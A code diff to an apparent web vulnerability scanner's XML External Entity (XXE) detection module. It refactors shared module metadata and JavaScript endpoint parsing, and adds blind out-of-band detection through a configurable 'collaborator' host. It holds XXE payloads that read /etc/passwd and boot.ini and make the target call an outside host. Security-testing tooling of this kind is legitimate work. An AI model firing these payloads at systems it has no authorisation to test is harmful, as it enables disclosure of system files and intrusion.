@@ -4,18 +4,36 @@ from core.scanner.module import *
 
 class IXXEScanner:
 
+    MODULE_INFO = {
+        "Authors": ["Abdallah Mohamed"],
+        "Name": "XML eXternal Entity Injection",
+        "Description": 'The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.',
+        "Risk": Risk.Critical,
+        "Referances": [
+            "https://cwe.mitre.org/data/definitions/611.html",
+            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+        ]
+    }
+
     def __init__(self):
         self._xxe_entity = "wrock"
+        self._collaborator = self.options.get('collaborator')
 
-    def generate_xxe_header(self, entity, payload):
+    def generate_xxe_header(self, entity, payload, entity_p=""):
         return "<?xml version=\"1.0\" encoding=\"utf-8\"?>" \
             + "<!DOCTYPE foo [" \
             + "<!ELEMENT foo ANY >" \
-            + "<!ENTITY %s SYSTEM \"%s\">" % ( entity, payload ) \
+            + "<!ENTITY %s SYSTEM \"%s\">%s" % ( entity, payload, entity_p ) \
             + "]>" 
     
+    def GetCollaborator(self):
+        return urljoin(self._collaborator if bool(re.match(r"^https?://", self._collaborator)) else "http://" + self._collaborator, f"{self.__class__.__name__}/{self.endpoint.GetPath()}") if self._collaborator else ""
+
     def GetFiles(self):
-        return [ "file:///etc/passwd", "file:///C:/boot.ini", "file:///D:/boot.ini" ]
+        return [ "file:///etc/passwd", "file:///C:/boot.ini", "file:///D:/boot.ini" ] + \
+            (
+                [ self.GetCollaborator() ] if self._collaborator else []
+            )
     
     def GetPayloads(self):
         payloads = []
@@ -23,6 +41,10 @@ class IXXEScanner:
 
         for file in self.GetFiles():
             payloads += [ self.generate_xxe_header( self._xxe_entity, file ) + xxe_body ]
+
+        # A creative way to detect blind cases even if we don't know exactly what tags are being taken 
+        if self._collaborator:
+            payloads += [ self.generate_xxe_header("% " + self._xxe_entity, self.GetCollaborator(), f"%{self._xxe_entity};") ]
 
         return payloads
 
@@ -41,18 +63,9 @@ class IXXEScanner:
 
 class XXEBodyBased( IXXEScanner, BodyScanner ):
 
-    def __init__(self, config, info = {
-        "Authors": ["Abdallah Mohamed"],
-        "Name": "XML eXternal Entity Injection",
-        "Description": 'The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.',
-        "Risk": Risk.Critical,
-        "Referances": [
-            "https://cwe.mitre.org/data/definitions/611.html",
-            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
-        ]
-    }) -> None:
-        IXXEScanner.__init__(self)
+    def __init__(self, config, info = IXXEScanner.MODULE_INFO) -> None:
         BodyScanner.__init__(self, config, info)
+        IXXEScanner.__init__(self)
 
         self.StopOnSuccess()
         self.headers = None
@@ -116,11 +129,21 @@ class XXEBodyBased( IXXEScanner, BodyScanner ):
         
 
     def find_endpoint(self, content) -> tuple[EndPoint, Headers, str]:
-        
+        idx = start = 0
+
         # Http client object for IE7+, Firefox, Chrome, Opera, Safari
-        idx = content.find( "XMLHttpRequest(" )
-        
-        if not bool(~idx):
+        s = "XMLHttpRequest"
+
+        while bool(~idx):
+            idx = content.find( s, start )
+            
+            if bool(~idx):
+                start = idx + len(s)
+                idx2 = self.skip_whitespaces( content, idx+len(s)-1 ) + 1
+                if content[idx2] == '(':
+                    break
+
+        else:
             # for IE6, IE5
             idx = content.find( "\"Microsoft.XMLHTTP\"" )
             if not bool(~idx):
@@ -176,13 +199,23 @@ class XXEBodyBased( IXXEScanner, BodyScanner ):
             #     x = new XMLHttpRequest(); // We are here, we need to move back to the declaration above
             # }
             idx2 = idx
-            while idx2 > 0 and content[idx2:idx2+len(obj_name)] != obj_name:
-                idx2 -= 1
+            while True:
+                while idx2 > 0 and content[idx2:idx2+len(obj_name)] != obj_name:
+                    idx2 -= 1
 
-            if idx2 > 0:
-                idx2 = self.skip_whitespaces( content, idx2+len(obj_name) )
-                if content[idx2] != '=':
-                    idx = idx2
+                if idx2 > 0:
+                    temp = idx2
+                    idx2 = self.skip_whitespaces( content, idx2+len(obj_name)-1 ) + 1
+                    if content[idx2] != '=':
+                        idx2 = self.skip_whitespaces( content, idx2, True ) - len( obj_name )
+                        idx2 = self.skip_whitespaces( content, idx2, True )
+                        if content[idx2-3:idx2] in ("var", "let") or content[idx2-5:idx2] == "const":
+                            idx = idx2
+                            break
+
+                    idx2 = temp - 1
+                else:
+                    break
 
         endpoint = None
         headers = Headers()
@@ -244,7 +277,7 @@ class XXEBodyBased( IXXEScanner, BodyScanner ):
         if not bool(~idx):
             return None
         
-        if not ( url.startswith("http") and "://" in url ):
+        if not ( bool(re.match(r"^https?://", url)) ):
             url = urljoin( self.GetEndPoint().GetUrl(), url )
 
         return EndPoint( url, method )
@@ -262,7 +295,8 @@ class XXEBodyBased( IXXEScanner, BodyScanner ):
         return payload if bool(~idx) else ""
 
     def parse_str(self, content, idx) -> tuple[str, int]:
-        if content[idx] != '"':
+        q = content[idx]
+        if q not in ( '"', '\'' ):
             return "", -1
         
         str_start = idx = idx + 1
@@ -272,25 +306,26 @@ class XXEBodyBased( IXXEScanner, BodyScanner ):
         if idx >= len(content):
             return "", -1
         
-        return content[str_start : idx], idx+1
+        return content[str_start : idx].replace('\\'+q, q) if idx != str_start else "", idx+1
     
     def parse_strparams(self, content, idx, n) -> tuple[list, int]:
         params = []
+        retonfail = [''] * n, -1
         idx = self.skip_whitespaces( content, idx )
         if content[idx] != '(':
-            return None
+            return retonfail
         
         while bool( n ):
             idx = self.skip_whitespaces( content, idx+1 ) 
             p, idx = self.parse_str( content, idx )
             if not bool(~idx):
-                return [], -1
+                return retonfail
             
             idx = self.skip_whitespaces( content, idx )
 
             if n > 1:
                 if content[idx] != ',':
-                    return [], -1
+                    return retonfail
             
             params += [ p ]
             n -= 1
@@ -300,17 +335,8 @@ class XXEBodyBased( IXXEScanner, BodyScanner ):
         
 class XXEParamsBased( IXXEScanner, ParamsScanner ):
 
-    def __init__(self, config, info = {
-        "Authors": ["Abdallah Mohamed"],
-        "Name": "XML eXternal Entity Injection",
-        "Description": 'The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.',
-        "Risk": Risk.Critical,
-        "Referances": [
-            "https://cwe.mitre.org/data/definitions/611.html",
-            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
-        ]
-    }) -> None:
-        IXXEScanner.__init__(self)
+    def __init__(self, config, info = IXXEScanner.MODULE_INFO) -> None:
         ParamsScanner.__init__(self, config, info)
+        IXXEScanner.__init__(self)
 
         self.StopOnSuccess()
